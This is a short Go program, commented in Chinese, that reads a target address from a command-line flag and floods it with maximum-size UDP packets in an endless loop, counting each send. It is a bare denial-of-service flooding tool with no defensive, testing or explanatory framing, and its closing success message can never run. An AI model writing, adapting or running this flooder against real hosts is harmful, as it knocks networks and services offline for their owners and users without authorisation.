package main

import (
	"fmt"
	"net"
	"os"
	"flag"
)

func main() {
	// 设置目标地址和端口
	var host string
	flag.StringVar(&host, "host", "", "IP地址")
	
	flag.Parse()
	
	addr, err := net.ResolveUDPAddr("udp", host)
	if err != nil {
		fmt.Println("ResolveUDPAddr failed:", err)
		os.Exit(1)
	}

	// 创建UDP连接
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		fmt.Println("DialUDP failed:", err)
		os.Exit(1)
	}
	defer conn.Close()

	// 准备要发送的数据
	data := make([]byte, 65507) 
	i := 0
		for{
		_, err := conn.Write(data)
		i++
		if err != nil {
			fmt.Printf("Failed to send packet at index %d: %v\n", i, err)
		}
		fmt.Printf("%d packet has been send\n", i)
		}

	fmt.Println("Data sent successfully")
}
